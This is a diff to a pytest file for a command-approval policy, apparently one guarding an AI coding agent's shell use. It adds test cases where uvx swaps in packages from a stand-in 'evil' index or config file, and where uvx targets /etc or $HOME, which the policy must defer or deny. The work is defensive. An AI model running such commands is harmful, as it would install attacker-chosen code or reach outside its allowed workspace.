@@ -58,14 +58,24 @@ def test_quoted_safe_words_allowed(client, base_event, command):
         "uvx --with evil ruff check",
         "uvx -w evil ruff check",
         "uvx --index-url https://evil.example/simple ruff check",
+        # A config file can name other package indexes
+        "uvx --config-file evil.toml ruff check",
     ],
 )
 def test_uvx_package_swapping_defers_to_user(client, base_event, command):
     check_policy(client, base_event, command, None)
 
 
-def test_uvx_directory_outside_workspace_denied(client, base_event):
-    check_policy(client, base_event, "uvx --directory /etc ruff check", "deny")
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uvx --directory /etc ruff check",
+        "uvx --directory=$HOME ruff check",
+        'uvx --directory="$HOME/x" ruff check',
+    ],
+)
+def test_uvx_directory_outside_workspace_denied(client, base_event, command):
+    check_policy(client, base_event, command, "deny")
 
 
 @pytest.mark.parametrize(
